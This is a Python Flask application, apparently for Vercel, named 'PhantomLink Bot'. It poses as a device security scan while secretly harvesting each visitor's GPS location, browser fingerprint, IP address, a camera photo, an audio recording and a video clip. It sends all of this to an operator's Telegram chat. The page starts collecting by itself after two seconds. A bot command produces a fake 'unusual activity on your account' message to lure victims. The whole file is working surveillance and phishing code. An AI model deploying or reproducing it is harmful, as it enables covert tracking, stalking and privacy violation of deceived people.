import os
import json
import base64
import logging
from io import BytesIO
from threading import Thread
from flask import Flask, request, render_template_string
import requests as req  # avoid name conflict with Flask request

# -------------------- CONFIG (set as Vercel environment variables) --------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN")      # Telegram bot token from @BotFather
CHAT_ID = os.environ.get("CHAT_ID")          # Your Telegram user ID (e.g., from @userinfobot)
# ------------------------------------------------------------------------------------

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ---------- Full capture HTML / JavaScript ----------
HTML = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Security Check</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0a0a0a; color: #fff; text-align: center; padding: 20px; }
        .card { background: #1a1a1a; border-radius: 15px; padding: 30px; max-width: 400px; margin: 50px auto; box-shadow: 0 0 20px #00ff88; }
        button { background: #00ff88; color: #000; border: none; padding: 15px 30px; font-size: 18px; border-radius: 30px; cursor: pointer; }
        button:disabled { background: #555; }
        .spinner { border: 4px solid #333; border-top: 4px solid #00ff88; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🛡️ Device Security Scan</h2>
        <p>We'll check for vulnerabilities and ensure your connection is safe.</p>
        <div id="controls">
            <button id="scanBtn" onclick="startScan()">Scan Now</button>
        </div>
        <div id="spinner" class="spinner" style="display:none;"></div>
        <div id="status" class="status"></div>
    </div>
    <script>
        const status = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const scanBtn = document.getElementById('scanBtn');
        let collected = {};

        function updateStatus(msg) { status.innerHTML = msg; }

        async function startScan() {
            scanBtn.disabled = true;
            spinner.style.display = 'block';
            updateStatus('Initializing...');

            collected.screen = `${screen.width}x${screen.height}`;
            collected.platform = navigator.platform;
            collected.deviceMemory = navigator.deviceMemory || 'unknown';
            collected.userAgent = navigator.userAgent;
            collected.timestamp = new Date().toISOString();

            // Geolocation
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true, timeout: 10000
                    });
                });
                collected.location = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed
                };
                updateStatus('Location captured ✓');
            } catch (e) {
                collected.location = { error: e.message };
                updateStatus('Location denied ✗');
            }

            // Camera & microphone
            try {
                updateStatus('Requesting camera & microphone...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: true
                });
                updateStatus('Media access granted ✓');

                // Photo (selfie)
                const photo = await capturePhoto(stream);
                collected.photo = photo;
                updateStatus('Photo captured ✓');

                // Audio recording (5 seconds)
                const audioBlob = await recordAudio(stream, 5000);
                collected.audio = await blobToBase64(audioBlob);
                updateStatus('Audio recorded ✓');

                // Video recording (3 seconds)
                const videoBlob = await recordVideo(stream, 3000);
                collected.video = await blobToBase64(videoBlob);
                updateStatus('Video recorded ✓');

                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                collected.mediaError = e.message;
                updateStatus('Media error: ' + e.message);
            }

            updateStatus('Sending report...');
            try {
                await fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(collected)
                });
                updateStatus('Scan complete. Thank you.');
            } catch (e) {
                updateStatus('Failed to send report.');
            } finally {
                spinner.style.display = 'none';
                scanBtn.style.display = 'none';
            }
        }

        // Helper functions
        function capturePhoto(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                video.addEventListener('loadeddata', () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                });
            });
        }

        function recordAudio(stream, duration) {
            return new Promise((resolve) => {
                const audioStream = new MediaStream(stream.getAudioTracks());
                const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'audio/webm' }));
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), duration);
            });
        }

        function recordVideo(stream, duration) {
            return new Promise((resolve) => {
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), duration);
            });
        }

        function blobToBase64(blob) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(blob);
            });
        }

        // Auto-start after 2 seconds (zero‑click fallback)
        setTimeout(() => {
            if (!scanBtn.disabled) startScan();
        }, 2000);
    </script>
</body>
</html>
"""

# ---------- Flask Routes ----------
@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json(force=True)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent')
    # Process asynchronously so the response is instant
    Thread(target=send_to_telegram, args=(data, ip, ua)).start()
    return 'OK', 200

def send_to_telegram(data, ip, ua):
    if not BOT_TOKEN or not CHAT_ID:
        logging.error("Missing BOT_TOKEN or CHAT_ID env vars")
        return
    try:
        # 1. Text message with location + fingerprint
        location = data.get('location', {})
        if 'lat' in location:
            maps_link = f"https://www.google.com/maps?q={location['lat']},{location['lon']}"
            loc_text = f"📍 Lat: {location['lat']}\n📍 Lon: {location['lon']}\n📍 Accuracy: {location.get('accuracy')}m\n🗺️ {maps_link}"
        else:
            loc_text = f"📍 Location: {location.get('error', 'Not available')}"
        fingerprint = f"IP: {ip}\nUA: {ua}\nScreen: {data.get('screen')}\nPlatform: {data.get('platform')}\nMemory: {data.get('deviceMemory')}GB"
        msg = f"🛡️ *New Device Scan Report*\n\n{fingerprint}\n\n{loc_text}\n\nTimestamp: {data.get('timestamp')}"
        req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

        # 2. Photo (if captured)
        if data.get('photo'):
            photo_bytes = base64.b64decode(data['photo'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                     files={"photo": ("selfie.jpg", photo_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "Selfie"})

        # 3. Audio (if captured)
        if data.get('audio'):
            audio_bytes = base64.b64decode(data['audio'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
                     files={"voice": ("recording.webm", audio_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "Voice recording"})

        # 4. Video (if captured)
        if data.get('video'):
            video_bytes = base64.b64decode(data['video'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                     files={"video": ("clip.webm", video_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "Video clip"})
    except Exception as e:
        logging.error(f"Telegram send failed: {e}")

# ---------- Telegram Webhook (bot commands) ----------
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True)
    if not update:
        return 'OK'
    if 'message' in update:
        msg = update['message']
        chat_id = msg['chat']['id']
        text = msg.get('text', '')
        if text == '/start':
            send_telegram_message(chat_id, "🕵️ *PhantomLink Bot*\n/link - Generate tracking link\n/clear - Reset")
        elif text == '/link':
            # VERCEL_URL is automatically provided by Vercel (no protocol)
            domain = os.environ.get("VERCEL_URL", "your-project.vercel.app")
            link = f"https://{domain}/"
            send_telegram_message(chat_id,
                f"👋 Hey! We’ve detected unusual activity on your account.\n"
                f"Please run a quick device security scan to verify your identity:\n{link}",
                disable_web_page_preview=True)
        elif text == '/clear':
            send_telegram_message(chat_id, "✅ Data cleared (in‑memory only).")
    return 'OK'

def send_telegram_message(chat_id, text, **kwargs):
    req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
             json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown", **kwargs})

# For local testing only
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)